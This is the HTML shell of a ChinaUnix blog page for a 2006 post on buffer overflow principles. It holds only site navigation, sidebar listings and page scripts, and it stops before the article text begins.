<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script>
var ua = navigator.userAgent.toLowerCase();
if(ua.match(/MicroMessenger/i)=="micromessenger") {
    location.href='http://blog.chinaunix.net/article.php?url='+ window.location.href;
}
</script>
        <style>
    .Blog_nav1_2 a em { display:inline-block; width:16px; height:13px; background:url(/image/v.jpg) no-repeat; overflow:hidden;}
</style>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" type="text/css" href="/css/default/style.css" />
<link rel="stylesheet" type="text/css" href="/css/qqface/qqFace.css" />
<link rel="stylesheet" type="text/css" href="/css/asyncbox/skins/Chrome/asyncbox.css" />
<link rel="stylesheet" type="text/css" href="/assets/6d60aeb8/pager.css" />
<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/jquery.cookies.min.js"></script>
<script type="text/javascript" src="/js/AsyncBox.v1.4.5.js"></script>
<title>缓冲区溢出的原理和实践-langzi2-ChinaUnix博客</title>
<meta name="description" content='在过去的几个月中,被发现和利用的缓冲区溢出漏洞呈现上升趋势.例如syslog,splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at等等.本文试图解释什么是缓冲区溢出, 以及'/>
<script type='text/javascript' src='http://168.it168.com/a/h600.js'></script>

<script type="text/javascript">
if(/AppleWebKit.*Mobile/i.test(navigator.userAgent) || (/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(navigator.userAgent))){
	try{
		if(!/iPad/i.test(navigator.userAgent)){
			var oldurl=window.location.href;
			var wapUrl= oldurl.replace('blog.chinaunix.net', "m.blog.chinaunix.net") ;
			window.location.href = wapUrl;
		}
	}catch(e){}
}
</script>


<script language="javascript">
//用户是否在线
var isOnLine = '';
$(document).ready(function(){
	var blog = {'name': '', 'name_url': '', 'brief': ''};
	//消息通知显示和隐藏控制
	$('#show_message_slide_button').hover(
		function(){
			$('#message_slide_div').slideDown(100);											   
		},
		function(){
			
		}
	);

	$('#message_slide_div').hover(
		function(){
			
		},
		function(){
			$('#message_slide_div').slideUp(100);
		}
	);
	
	//编辑博客名
	$('#editbna').click(function(){
		blog.name = $('#bnaspan a').text();
		var val = '<input id="bnainput" type="text" style="float:left" value="" rel="' +$(this).attr('rel') + '" /><input id="bnasub" type="button" style="float:left" class="btn1"><input id="bnacanl" type="button" style="float:left" class="btn2"><div class="clear"></div>';
		$('#bnaspan').html(val);
		$('#bnainput').val(blog.name);
		$(this).parent().hide();
	});
	
	$('#bnasub').live('click', function(){
	    var rel = eval('({' + $('#bnainput').attr('rel') + '})');
		var name = $('#bnainput').val();
		if(name != blog.name){
	        $.ajax({
			    type: "POST",
			    url: rel.url,	
			    data: {
				    'name' : name
			    },
			    success:function(data){
				    if(data == 0){
						$('#bnaspan').html(blog.name);
						$('#bnaspan').html('<a href="' + rel.href + '">' + $('#bnaspan').html() + '</a>');
				    }else{
						$('#bnaspan').html(data);
						$('#bnaspan').html('<a href="' + rel.href + '">' + $('#bnaspan').html() + '</a>');
				    }
					$('#editbna').parent().show();
				}
			});
		}else{
		    $('#bnaspan').text(blog.name).html();
			$('#bnaspan').html('<a href="' + rel.href + '">' + $('#bnaspan').html() + '</a>');
			$('#editbna').parent().show();
		}
	});
	
	$('#bnacanl').live('click', function(){
		var rel = eval('({' + $('#bnainput').attr('rel') + '})');
		$('#bnaspan').html('<a href="' + rel.href + '">' + blog.name + '</a>');
		$('#editbna').parent().show();
	});
	
	//编辑签名
	$('#editbrief').click(function(){
	    blog.brief = $('#briefem').text();
		var val = '<input id="brfinput" type="text" style="float:left" value="" rel="' + $(this).attr('rel') + '" /><input id="brfsub" style="float:left"  type="button" class="btn1"><input style="float:left"  id="brfcanl" type="button" class="btn2"><div class="clear"></div>';
		$('#briefem').html(val);
		$('#brfinput').val(blog.brief);
		$(this).parent().hide();
	});
	
	$('#brfsub').live('click', function(){
	    var url = $('#brfinput').attr('rel');
		var brief = $('#brfinput').val();
		if(brief != blog.brief){
	        $.ajax({
			    type: "POST",
			    url: url,	
			    data: {
				    'brief' : brief
			    },
			    success:function(data){
				    if(data == 0){
				        $('#briefem').html(blog.brief);
				    }else{
						$('#briefem').html(data);
				    }
					$('#editbrief').parent().show();
				}
			});
		}else{
		    $('#briefem').text(blog.brief).html();
			$('#editbrief').parent().show();
		}
	});
	
	$('#brfcanl').live('click', function(){
		$('#briefem').html(blog.brief);
		$('#editbrief').parent().show();
	});

});
</script>
</head>
<body>
<div class="box">
  <!-- 一级导航 -->
  <div class="Blog_nav1">
    <div class="Blog_nav1_2"><a href="/"><img src="/image/default/1.png"></a><a href="http://www.chinaunix.net" class="Blog_a1">Chinaunix首页</a> | <a href="http://bbs.chinaunix.net" target="_blank">论坛</a> | <a href="http://u.it168.com/vip/"><font color="red">认证专区</font></a> | <a href="http://blog.chinaunix.net" target="_blank">博客</a><span class="Blog_span1"></span>
            <a href="/site/login.html" class="Blog_a1">登录</a> | <a href="http://u.it168.com/Register?webid=5&returnUrl=http%3A%2F%2Fblog.chinaunix.net%2Fuid-20437758-id-1946139.html" class="Blog_a1">注册</a>
          </div>
	<!--自动提示层-->
	<style>
	.bor13221{border:1px #bbb solid;width:206px;position:absolute;top:34px;left:0;background:#fff; z-index:9999;display:none}
	.bor13221 li{height:26px;line-height:26px;padding-left:6px;color:#555;font-size:14px;cursor:pointer;}
	.here{background:#f3f3f3;}
    </style>

	<!--自动提示层-->
    <div class="Blog_nav1_3" style="position:relative; z-index:9999;">
	 <div class="bor13221">
      <ul>
      </ul>
    </div>
	  <form action='/site/search.html' method='post'>
		<input type="text"  autocomplete="off"  class="Blog_txt1" id='search_input_id' name='keywords'>
		<select class="Bolg_sel1" name='type' id='search_type_blog'>
		  <option value='blog'>博文</option>
		  <option value='author'>博主</option>
		</select>
		<input type="submit" value='' name='submit' class="Blog_btn1">
	 </form>
    </div>
    <div class="clear"></div>
    <div class="Blog_nav1_layer1" id="message_slide_div" style="display:none;">
	    <ul>
	    	<li><a href="/message/private.html">私人消息()</a></li>
	    	<li><a href="/message/system.html">系统消息()</a></li>
	    	<li><a href="/member/request.html">好友请求()</a></li>
	    	<li><a href="/member/notification.html">通知管理()</a></li>
	    </ul>
    </div>
  </div>
   <script type="text/javascript">
  	$(function(){
		//点击添加进文本框
		$(".bor13221 li").live( 'click' , function(e){
			if ( e && e.stopPropagation )
			{
				//因此它支持W3C的stopPropagation()方法
				e.stopPropagation();
			}
			else
			{
				//否则，我们需要使用IE的方式来取消事件冒泡
				window.event.cancelBubble = true; 
			}
			$('#search_input_id').val($(this).text());
			$(".bor13221 ul").html('');
			$(".bor13221").hide();
		});
		$(".bor13221 ul li").live({
			mouseenter:
			function()
			{
				$(".bor13221 ul li").removeClass("here");
				$(this).addClass('here');
			},
			mouseleave:
			function()
			{
				$(".bor13221 ul li").removeClass("here");
				$(this).removeClass('here');
			}
		});
		//自动提示
		$('#search_input_id').keyup(function(event){
			//取消博主的提示
			var search_type_blog = $('#search_type_blog').val();
			if(search_type_blog == 'author') return false;

			var key = $(this).val();
			//获取键值
			var keycode = event.which; //38 上 40 下
			var count = $('.bor13221 ul li').length;
			if(key != '' && keycode != 38 && keycode != 40)
			{
				$.getJSON("http://api.sou.it168.com/autoWenKuCloud?jsoncallback=?",{"ty":"json","offset":"0","limit":"10","q":key}, function(result)
					{
						var arr = result.data;

						var html ='';
						for (i=0;i<arr.length ;i++ )   
						{   
							html += '<li>'+arr[i]+'</li>';
						} 
						
						$('.bor13221 ul').html(html);
						(arr.length > 1) ?  $(".bor13221").show() : $(".bor13221").hide();
					}
				);
			}
			else if(keycode == 38)
			{
				if(count > 0)
				{
					//遍历li
					var curr_li_num;
					$('.bor13221 ul li').each(function(index , dom){
						if($(dom).attr('class') == 'here')
						{
							curr_li_num = index;
							return false;
						}
					}); 
					var next_li_num;
					if(typeof(curr_li_num) == 'undefined')
					{
						next_li_num = count - 1;
					}
					else
					{
						if(curr_li_num == 0)
						{
							next_li_num = count - 1;
						}
						else
						{
							next_li_num = curr_li_num - 1;
						}
					}
					$(".bor13221 ul li").removeClass("here");
					$(".bor13221 ul li:eq(" + next_li_num + ")").addClass("here");
					$('#search_input_id').val($(".bor13221 ul li:eq(" + next_li_num + ")").text());
				}
			}
			else if(keycode == 40)
			{
				if(count > 0)
				{
					//遍历li
					var curr_li_num;
					$('.bor13221 ul li').each(function(index , dom){
						if($(dom).attr('class') == 'here')
						{
							curr_li_num = index;
							return false;
						}
					}); 
					var next_li_num;
					if(typeof(curr_li_num) == 'undefined')
					{
						next_li_num = 0;
					}
					else
					{
						if(curr_li_num == count - 1)
						{
							next_li_num = 0;
						}
						else
						{
							next_li_num = curr_li_num + 1;
						}
					}
					$(".bor13221 ul li").removeClass("here");
					$(".bor13221 ul li:eq(" + next_li_num + ")").addClass("here");
					$('#search_input_id').val($(".bor13221 ul li:eq(" + next_li_num + ")").text());
				}
			}
		});
		$(document).click(function(e){
			$(".bor13221").hide();
		});

	});
  </script>
  <!-- 头 -->
  <!-- 推荐博客-->
  <div class="Blog_header1">
	    <div class="Blog_header1_1">
      <p class="Blog_p1" ><em><a href="/uid/20437758.html">浪子天空</a></em>      <p class="Blog_p2" style="color:#125A94">暂无签名</p>
    </div>
        <div class="Blog_header1_2" id="hide_div1">
    	<span class="Blog_span3"></span>
    	<div class="float_div1" style="white-space:nowrap;" onmouseover="javascript:isMove=false" onmouseout="javascript:isMove=true">
	    <ul id="noticev2">  
		    		    <li><a href="http://blog.chinaunix.net/uid-24789255-id-198226.html" target="_blank">ChinaUnix博客技术文章推荐标准和规范 </a></li>
		    		    <li><a href="http://blog.chinaunix.net/uid-24789255-id-4288187.html" target="_blank">有奖征集：文集--博客系列博文管理</a></li>
		    		    <li><a href="http://blog.chinaunix.net/uid-24789255-id-4289076.html" target="_blank">CU博客频道6月技术图书有奖试读活动 </a></li>
		    	    </ul>
	    </div>
    </div>
            <div class="Blog_header1_3"><a href="/uid/20437758.html">首页</a>　| 　<a href="/uid/20437758/abstract/1.html">博文目录</a>　| 　<a href="/member/profile/uid/20437758.html">关于我</a></div>
  </div>
    
  <!-- 内容部分 -->
  	<script type="text/javascript" src="/highlight/scripts/XRegExp.js"></script> <!-- XRegExp is bundled with the final shCore.js during build -->
<script type="text/javascript" src="/highlight/scripts/shCore.js"></script>
<script type="text/javascript" src="/highlight/scripts/shAutoloader.js"></script>
<link type="text/css" rel="stylesheet" href="/highlight/styles/shCore.css"/>
<link type="text/css" rel="Stylesheet" href="/highlight/styles/shThemeDefault.css" />
<link href="/code/css/fck_editorarea.css" rel="stylesheet" type="text/css" />
<style>
.Blog_p5 em{ display:inline-block; width:16px; height:13px; background:url(/image/v.jpg) no-repeat; overflow:hidden;}
</style>
  <div class="Blog_contain"> 
    <!-- 左 -->
	<style>
    .Blog_left1_1 p a em { display:inline-block; width:16px; height:13px; background:url(/image/v.jpg) no-repeat; overflow:hidden;}
</style>

<script language="javascript">
$(document).ready(function(){
	$('#ConcernBtn').bind('click',function(){
			var cuid = '20437758';
			var url =  '/member/concern.html';
			var type = $(this).attr('rel');
		
			if(type == 'addConcern'){
				$.ajax({
					type : 'get',
					url  : url,
					data : {'op' : 'ajaxadd' , 'cuid' : cuid, 'random' : Math.random()},
					success : function(msg){	
					   if(msg == -1){
						   showErrorMsg('参数错误！');
					   } else if (msg == 0){
						   showErrorMsg('关注失败，没有该用户！');
					   } else if (msg == 1){
						   showErrorMsg('关注失败，您已经关注了该用户！');
					   } else if (msg == 2){
						   $('#ConcernBtn').val('已关注');
						   $('#ConcernBtn').attr('rel','delConcern');
						   showSucceedMsg('关注成功!');
					   } else if (msg == 3){
						   showErrorMsg('未知错误');
					   }
					}
				});	
			} else if ( type == 'delConcern'){
				$.ajax({
					type : 'get',
					url  : url,
					data : {'op' : 'ajaxdel' , 'cuid' : cuid, 'random' : Math.random()},
					success : function(msg){
					   if(msg == 0){
						   showErrorMsg('参数错误！','消息提示');
					   } else if (msg == 1){
						   showErrorMsg('操作失败，请尝试刷新页面重试！','消息提示');
					   } else if (msg == 2){
						   $('#ConcernBtn').val('加关注');
						   $('#ConcernBtn').attr('rel','addConcern');
						   showSucceedMsg('成功取消关注！','消息提示');
					   } else if (msg == 3){
						   showErrorMsg('未知错误！','消息提示'); 
					   }
					}
				});	
			}
	});					   
});

//加好友
function addFriend(fuid, url){
	if(fuid == '' || fuid.length == 0){
		showErrorMsg('缺少参数！','信息提示');
		return false;
	}
	$.ajax({
		   type : 'get',
		   url : url,
		   data : {'op' : 'add', 'fuid' : fuid , 'random' : Math.random()},
		   success : function(msg){
				if(msg == -1){
					showErrorMsg('参数错误！','消息提示');
				} else if (msg == -2){
					showErrorMsg('添加好友失败,没有该用户的信息！','消息提示');
				} else if (msg == -3){
					showErrorMsg('添加好友失败,你不能添加自己为好友！','消息提示');
				} else if (msg == -4){
					showErrorMsg('添加好友未知错误,该错误已被记录！','消息提示');
				} else if (msg == -5){
					showErrorMsg('添加好友失败,你之前已经发送过好友请求,请耐心等待对方同意申请！','消息提示');
				} else if (msg == -6){
					showErrorMsg('添加好友失败,你们已经是好友了！','消息提示');
				} else {
					$.cover(true);
					asyncbox.open({
						id : 'addFriend',
						title : '添加好友',
						url : url,
						data : {'op' : 'add', 'fuid' : fuid , 'random' : Math.random()},
						width : 490,
						height : 180,
						scroll : 'no',
						callback : function(action) {
							if (action == 'close'){
								$.cover(false);
							}	
						}
					});	
				}
		   }
	});	
	
}

//发送短消息
function postMessage(msguid, url){
	if(msguid == '' || msguid.length == 0){
		showErrorMsg('缺少参数！','信息提示');
		return false;
	}
	
	$.ajax({
		   type : 'post',
		   url : url,
		   data : {'op' : 'ajaxpost', 'msguid' : msguid , 'random' : Math.random()},
		   success : function(msg){
				if(msg == -1){
					showErrorMsg('发送失败，缺少收件人对象！','消息提示');
				} else if(msg == -2){
					showErrorMsg('发送失败，自己不能给自己发送短消息！','消息提示');
				} else {
					$.cover(true);
					asyncbox.open({
						id : 'postMessage',
						title : '发送短消息',
						url : url,
						data : {'op' : 'ajaxpost', 'msguid' : msguid , 'random' : Math.random()},
						width : 510,
						height : 255,
						scroll : 'no',
						callback : function(action) {
							if (action == 'close'){
								$.cover(false);
							}	
						}
					});	
				}
		   }
	});	
}

</script>
<div class="Blog_left">
      <div class="Blog_left1 Blog_bg1">
        <div class="Blog_left1_1">
			<!-- 专家博客-->
			<a href="/uid/20437758.html"><img src="http://passport.ixpub.net/data/avatar/020/43/77/58_avatar_middle.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_middle.gif'" /></a>
                        <p><a href="/uid/20437758.html">langzi2</a></p>
                     </div>
        <ul class="Blog_ul1 Blog_noline1">
          <li>博客访问： 224733 </li>
          <li>博文数量： 152 </li>
          <li>博客积分： 3020 </li>
          <!--<li>专家积分： 180</li>-->
          <li>博客等级： 中校 </li>
		  <li>技术积分： 1390 </li>
          <li>用  户  组：  普通用户</li>
          <li>注册时间： 2006-07-03 13:21 </li>
                            </ul>  


        
                <div class="HT_line3 HT_line3_1"></div>
        <ul class="Blog_ul2">
          <li><input type="button" value="加关注" id="ConcernBtn" onclick="showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html')"></li>
          <li><input type="button" value="短消息" id="postMessageBtn" onclick="showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html')"></li>
          <li><input type="button" value="论坛" onclick="location.href='http://bbs.chinaunix.net'"></li>
          <li><input type="button" value="加好友" id="addFriendBtn" onclick="showErrorMsg('操作失败,您需要先登录!', '消息提示', '/site/login.html')"></li>
        </ul>
              </div>
        
         
      <div class="Blog_left2 Blog_bg1">
        <div class="Blog_tit1">文章分类</div>
        <div class="Blog_left2_1">
          <p class="Blog_p4"><a href="/uid/20437758/list/1.html">全部博文</a>（152）</p>
          <ul id="blogCla">
                            <li><a href="/uid/20437758/cid-51002-list-1.html" title="摄影技巧">摄影技巧</a>（1）
                                </li>
                            <li><a href="/uid/20437758/cid-51001-list-1.html" title="电子技术">电子技术</a>（15）
                                </li>
                            <li><a href="/uid/20437758/cid-51000-list-1.html" title="管理与营销">管理与营销</a>（9）
                                </li>
                            <li><a href="/uid/20437758/cid-50999-list-1.html" title="嵌入式ARM-ucLinux">嵌入式ARM-ucLinu</a>（6）
                                </li>
                            <li><a href="/uid/20437758/cid-50994-list-1.html" title="Linux内核编程">Linux内核编程</a>（8）
                                </li>
                            <li><a href="/uid/20437758/cid-50998-list-1.html" title="其他文章">其他文章</a>（13）
                                </li>
                            <li><a href="/uid/20437758/cid-50997-list-1.html" title="英语学习">英语学习</a>（3）
                                </li>
                            <li><a href="/uid/20437758/cid-50996-list-1.html" title="ASP 编程">ASP 编程</a>（7）
                                </li>
                            <li><a href="/uid/20437758/cid-50995-list-1.html" title="面试技巧">面试技巧</a>（3）
                                </li>
                            <li><a href="/uid/20437758/cid-50993-list-1.html" title="汇编语言">汇编语言</a>（4）
                                </li>
                            <li><a href="/uid/20437758/cid-50992-list-1.html" title="单片机编程">单片机编程</a>（28）
                                </li>
                            <li><span class="Blog_jia1"></span><a href="/uid/20437758/cid-50990-list-1.html" title="数据结构算法">数据结构算法</a>（16）
                                    <div style="display:none;" class="zk">
					                        <p><a href="/uid/20437758/sid-50991-list-1.html" title="树操作练习">树操作练习</a>（1）</p>
                                        </div>
                                </li>
                            <li><a href="/uid/20437758/cid-50989-list-1.html" title="浪子程序笔记">浪子程序笔记</a>（17）
                                </li>
                            <li><a href="/uid/20437758/cid-50988-list-1.html" title="vc编程技术">vc编程技术</a>（20）
                                </li>
                            <li><a href="/uid/20437758/cid--1-list-1.html" title="未分配的博文">未分配的博文</a>（2）
                                </li>
                      </ul>
        </div>
      </div>
      	              <div class="Blog_left2 Blog_bg1">
        <div class="Blog_tit1">文章存档</div>
        <div class="Blog_left2_1" id="blogdtr">
                    <p class="Blog_p4"><span class="Blog_jia1"></span><a href="/uid/20437758/year-2011-list-1.html">2011年</a>（2）</p>
          <ul style="display:none;" class="Blog_ul3 zk">
                        <li><a href="/uid/20437758/year-201109-list-1.html">2011年09月</a>（1）</li>
                        <li><a href="/uid/20437758/year-201107-list-1.html">2011年07月</a>（1）</li>
                      </ul>
                    <p class="Blog_p4"><span class="Blog_jia1"></span><a href="/uid/20437758/year-2010-list-1.html">2010年</a>（4）</p>
          <ul style="display:none;" class="Blog_ul3 zk">
                        <li><a href="/uid/20437758/year-201012-list-1.html">2010年12月</a>（1）</li>
                        <li><a href="/uid/20437758/year-201006-list-1.html">2010年06月</a>（2）</li>
                        <li><a href="/uid/20437758/year-201001-list-1.html">2010年01月</a>（1）</li>
                      </ul>
                    <p class="Blog_p4"><span class="Blog_jia1"></span><a href="/uid/20437758/year-2009-list-1.html">2009年</a>（24）</p>
          <ul style="display:none;" class="Blog_ul3 zk">
                        <li><a href="/uid/20437758/year-200909-list-1.html">2009年09月</a>（1）</li>
                        <li><a href="/uid/20437758/year-200908-list-1.html">2009年08月</a>（18）</li>
                        <li><a href="/uid/20437758/year-200907-list-1.html">2009年07月</a>（3）</li>
                        <li><a href="/uid/20437758/year-200905-list-1.html">2009年05月</a>（1）</li>
                        <li><a href="/uid/20437758/year-200903-list-1.html">2009年03月</a>（1）</li>
                      </ul>
                    <p class="Blog_p4"><span class="Blog_jia1"></span><a href="/uid/20437758/year-2008-list-1.html">2008年</a>（1）</p>
          <ul style="display:none;" class="Blog_ul3 zk">
                        <li><a href="/uid/20437758/year-200809-list-1.html">2008年09月</a>（1）</li>
                      </ul>
                    <p class="Blog_p4"><span class="Blog_jia1"></span><a href="/uid/20437758/year-2007-list-1.html">2007年</a>（4）</p>
          <ul style="display:none;" class="Blog_ul3 zk">
                        <li><a href="/uid/20437758/year-200703-list-1.html">2007年03月</a>（1）</li>
                        <li><a href="/uid/20437758/year-200701-list-1.html">2007年01月</a>（3）</li>
                      </ul>
                    <p class="Blog_p4"><span class="Blog_jia1"></span><a href="/uid/20437758/year-2006-list-1.html">2006年</a>（117）</p>
          <ul style="display:none;" class="Blog_ul3 zk">
                        <li><a href="/uid/20437758/year-200611-list-1.html">2006年11月</a>（3）</li>
                        <li><a href="/uid/20437758/year-200610-list-1.html">2006年10月</a>（10）</li>
                        <li><a href="/uid/20437758/year-200609-list-1.html">2006年09月</a>（11）</li>
                        <li><a href="/uid/20437758/year-200608-list-1.html">2006年08月</a>（36）</li>
                        <li><a href="/uid/20437758/year-200607-list-1.html">2006年07月</a>（57）</li>
                      </ul>
                  </div>
      </div>
      	  	        <div class="Blog_left2 Blog_bg1">
        <div class="Blog_tit1">我的朋友</div>
        <ul class="Blog_ul4">
                  </ul>
      </div>
	  	        <div class="Blog_left2 Blog_bg1">
        <div class="Blog_tit1">最近访客</div>
        <ul class="Blog_ul4">
                    <li><a href="/uid/29840040.html"><img src="http://passport.ixpub.net/data/avatar/029/84/00/40_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/29840040.html" title="圣人指路">圣人指路</a></p>
          </li>
                    <li><a href="/uid/30092069.html"><img src="http://passport.ixpub.net/data/avatar/030/09/20/69_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/30092069.html" title="Portguas">Portguas</a></p>
          </li>
                    <li><a href="/uid/29135978.html"><img src="http://passport.ixpub.net/data/avatar/029/13/59/78_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/29135978.html" title="hapy_bird">hapy_bir</a></p>
          </li>
                    <li><a href="/uid/30096355.html"><img src="http://passport.ixpub.net/data/avatar/030/09/63/55_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/30096355.html" title="robotcoding">robotcod</a></p>
          </li>
                    <li><a href="/uid/30043003.html"><img src="http://passport.ixpub.net/data/avatar/030/04/30/03_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/30043003.html" title="wpp2014">wpp2014</a></p>
          </li>
                    <li><a href="/uid/28712108.html"><img src="http://passport.ixpub.net/data/avatar/028/71/21/08_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/28712108.html" title="YB_NingYan">YB_NingY</a></p>
          </li>
                    <li><a href="/uid/30065388.html"><img src="http://passport.ixpub.net/data/avatar/030/06/53/88_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/30065388.html" title="zryzchris">zryzchri</a></p>
          </li>
                    <li><a href="/uid/29987665.html"><img src="http://passport.ixpub.net/data/avatar/029/98/76/65_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/29987665.html" title="十佳青年">十佳青年</a></p>
          </li>
                    <li><a href="/uid/29986098.html"><img src="http://passport.ixpub.net/data/avatar/029/98/60/98_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /></a>
            <p><a href="/uid/29986098.html" title="LIU_92cheng">LIU_92ch</a></p>
          </li>
                  </ul>
      </div>
	           <div  class="Blog_left2 Blog_left3 Blog_bg1">
        <div class="Blog_tit1">微信关注</div>
        <div class="">
                <div class="" style="float:left; margin-right:5px;">
                 <img width="90" height="90" alt="" src="/image/IT168.jpg"/>
                 </div><br>
                <div class="" style="margin-top:10px;">
                 <p class="">
                         IT168企业级官微
                </p>
                 <p class="">

                 <br></br>
                 微信号：IT168qiye
                </p>
                </div>
        </div>
<hr size="1" style="clear:both;">
        <div class="" style="clear:both;">
                <div class="" style="float:left; margin-right:5px;">
                 <img width="90" height="90" alt="" src="/image/itpub.jpg"/>
                 </div><br>
                <div class="" style="margin-top:10px;">
                 <p class="">
                         系统架构师大会
                </p>
                 <p class="">

                 <br></br>
                 微信号：SACC2013
                </p>
                </div>
        </div>

</div>
      <div class="Blog_left2 Blog_bg1">
        <div class="Blog_tit1">订阅</div>
        <ul class="Blog_ul5">
          <li><a href="/blog/rss/uid/20437758.html" class="Blog_a4"></a></li>
          <li><a href="http://www.google.com/ig/add?feedurl=http%3A%2F%2Fblog.chinaunix.net%2Fuid%2F20437758.html" class="Blog_a5"></a></li>
        </ul>
      </div>
      <div class="Blog_left2 Blog_left3 Blog_bg1">
        <div class="Blog_tit1">推荐博文</div>
        <ul class="Blog_ul6">
				  			<li>·<a href="/uid-23629988-id-4807044.html" title="Linux内核连接跟踪锁的优化分析（2）">Linux内核连接跟踪锁的优化分...</a></li>
		  			<li>·<a href="/uid-7411781-id-4806496.html" title="运维案例：云主机远程链接公司内网系统">运维案例：云主机远程链接公...</a></li>
		  			<li>·<a href="/uid-301743-id-4801730.html" title="Nginx的负载均衡方案详解">Nginx的负载均衡方案详解...</a></li>
		  			<li>·<a href="/uid-301743-id-4801677.html" title="用Nginx做NodeJS应用的负载均衡">用Nginx做NodeJS应用的负载均...</a></li>
		  			<li>·<a href="/uid-29025972-id-4801417.html" title=" linux终端设备uart驱动分析"> linux终端设备uart驱动分析...</a></li>
		  						  			<li>·<a href="http://blog.itpub.net/26015009/viewspace-1417623" title="还原点和闪回数据库">还原点和闪回数据库</a></li>
		  			<li>·<a href="http://blog.itpub.net/29821678/viewspace-1417458" title="影响RESIZE数据文件的因素">影响RESIZE数据文件的因素...</a></li>
		  			<li>·<a href="http://blog.itpub.net/7192724/viewspace-1416548" title="resource角色对quota表空间限额的影响">resource角色对quota表空间限...</a></li>
		  			<li>·<a href="http://blog.itpub.net/15480802/viewspace-1416446" title="TCP segmentaion 和 checksum offload">TCP segmentaion 和 checksum...</a></li>
		  			<li>·<a href="http://blog.itpub.net/29475508/viewspace-1416188" title="Virtualbox 虚拟机安装 Windows10 预览版">Virtualbox 虚拟机安装 Windo...</a></li>
		  				
        </ul>
      </div>
      <div class="Blog_left2 Blog_left3 Blog_bg1">
        <div class="Blog_tit1">热词专题</div>
        <ul class="Blog_ul6">
                        <li >·<a href="/zt/1007/linuxduo_1007427.shtml" target='blank' title='LINUX中打开文件数设置（转）'>LINUX中打开文件数设置（转）...</a></li>
                        <li >·<a href="/zt/1007/mysqlbanhajin_1007171.shtml" target='blank' title='MySQL数据库安装'>MySQL数据库安装</a></li>
                        <li class="no_line1">·<a href="/zt/1004/linuxjian_1004301.shtml" target='blank' title='Linux下U盘的挂载，卸载 '>Linux下U盘的挂载，卸载 ...</a></li>
                        <li>·<a href="http://www.dataguru.cn/zhuanti/hadoop220peizhi.shtml" target='blank' title='配置hadoop2.2.0格式化namenode问题'>配置hadoop2.2.0格式化nameno...</a></li>
              <li>·<a href="http://www.dataguru.cn/zhuanti/hadoopshouce.shtml" target='blank' title='hadoop2.2.0安装手册'>hadoop2.2.0安装手册</a></li>
        </ul>
      </div>
	  

	</div>
<script language="javascript">
$(document).ready(function(){
    /*目录树JS效果*/
	$('#blogCla li > span').click(function(){
		var cla = $(this).attr('class');
		if(cla == 'Blog_jia1'){
			//$('#blogCla li > span').removeClass('Blog_jian1').addClass('Blog_jia1');
			//$('#blogCla li > .zk').css('display', 'none');
				
			$(this).removeClass('Blog_jia1').addClass('Blog_jian1');
            $(this).parent().children('.zk').css('display', 'block');
		}else{
			$(this).removeClass('Blog_jian1').addClass('Blog_jia1');
            $(this).parent().children('.zk').css('display', 'none');
		}
	});
		
	$('#blogdtr > p > span').click(function(){
		var cla = $(this).attr('class');
		if(cla == 'Blog_jia1'){
			//$('#blogdtr > .Blog_p4 > span').removeClass('Blog_jian1').addClass('Blog_jia1');
			//$('#blogdtr ul').css('display', 'none');
				
			$(this).removeClass('Blog_jia1').addClass('Blog_jian1');
            $(this).parent().next().css('display', 'block');
		}else{
			$(this).removeClass('Blog_jian1').addClass('Blog_jia1');
            $(this).parent().next().css('display', 'none');
		}
	});
});
</script>    <!-- 右 -->
    <div class="Blog_right1">
      <div class="Blog_right1_1 Blog_right1_11">
        <div class="Blog_right1_2 ">
			<!--推荐博文-->
          <div class="Blog_tit4 Blog_tit5">
                        <b class="Blog_b1"></b>
            <a href="/uid-20437758-id-1946139.html">缓冲区溢出的原理和实践</a>
            <em>2006-07-16 22:46:19</em>
          </div>
          <div class="Blog_con2">
            <div class="Blog_con3">
              <p>分类： <span></span></p>
			                </p>
            </div>
           <div class="Blog_wz1" style='word-wrap: break-word;'>
